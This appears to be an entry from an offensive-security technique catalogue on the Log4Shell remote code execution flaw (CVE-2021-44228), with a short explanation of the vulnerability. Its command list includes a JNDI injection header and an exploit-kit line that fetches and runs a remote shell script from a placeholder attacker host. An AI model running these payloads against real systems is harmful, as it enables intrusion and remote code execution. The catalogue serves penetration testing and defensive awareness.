---
id: init-003
title: "Log4Shell RCE (CVE-2021-44228)"
category: initial_access
tags: [log4shell, log4j, jndi-injection, rce, cve-2021-44228, java]
platform: [linux, windows]
commands:
  - "python3 log4shell-scan.py -u https://target.example.com/login -p email"
  - "curl -H 'X-Api-Version: ${jndi:ldap://<attacker-ip>:1389/exploit}' https://target.example.com/"
  - "java -jar JNDI-Exploit-Kit.jar -C 'curl http://<attacker-ip>/shell.sh|bash' -A <attacker-ip>"
  - "nuclei -t cves/2021/CVE-2021-44228.yaml -u https://target.example.com"
references:
  - "https://www.lunasec.io/docs/blog/log4j-zero-day/"
  - "https://github.com/fullhunt/log4j-scan"
---

Log4Shell is a critical unauthenticated remote code execution vulnerability in Apache Log4j 2.x (prior to 2.15.0) that allows attackers to trigger JNDI lookups by injecting the `${jndi:ldap://attacker-host/payload}` string into any data that Log4j processes, including HTTP headers, form fields, User-Agent strings, and log messages. When the vulnerable application logs the injected string, Log4j resolves the JNDI URL, connects to the attacker-controlled LDAP server, and deserializes the returned Java object — executing arbitrary code on the target host. Despite being disclosed in December 2021, many unpatched Log4j deployments remain in production environments, particularly in legacy applications and internal tooling.
